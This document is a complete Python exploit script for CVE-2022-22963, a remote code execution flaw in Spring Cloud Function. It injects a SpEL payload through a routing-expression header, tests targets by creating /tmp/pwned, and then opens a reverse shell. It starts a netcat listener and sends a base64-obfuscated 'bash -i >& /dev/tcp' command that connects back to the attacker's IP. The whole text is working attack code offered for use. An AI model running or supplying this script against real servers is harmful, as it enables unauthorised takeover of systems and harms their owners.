#!/usr/bin/python3
import requests
import argparse
import socket, sys, time
from threading import Thread
import os
import base64

def nc_listener():
    os.system("nc -lnvp 4444")

def exploit(url,cmd):
    vulnURL = f'{url}/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    body = '.'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
        }
    response = requests.post(url = vulnURL, data = body, headers = headers, verify=False, timeout=5)
    return response

def vuln(code,text):
    resp = '"error":"Internal Server Error"'
    if code == 500 and resp in text:
        print(f'[+] {args.url} is vulnerable\n')
        return True
    else:
        print(f'[-] {args.url} is not vulnerable\n')
        return False

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL of the site with spring Framework, example: http://vulnerablesite.com:8080")
    args = parser.parse_args()
    
    if args.url is None:
        parser.print_help()
        sys.exit(1)
    
    print(f"[+] Target {args.url}\n")
    print(f"[+] Checking if {args.url} is vulnerable to CVE-2022-22963...\n")
    response = exploit(args.url,"touch /tmp/pwned")
    v = vuln(response.status_code,response.text)
    if v == True:
        chk = input("[/] Attempt to take a reverse shell? [y/n]")
        if chk == 'y' or chk == 'Y':
            listener_thread = Thread(target=nc_listener)
            listener_thread.start()
            time.sleep(2)
            attacker_ip=input("[$$] Attacker IP:  ")
            command = f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1"
            final_command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
            exploit(args.url,final_command)
    else:
    	exit(0)
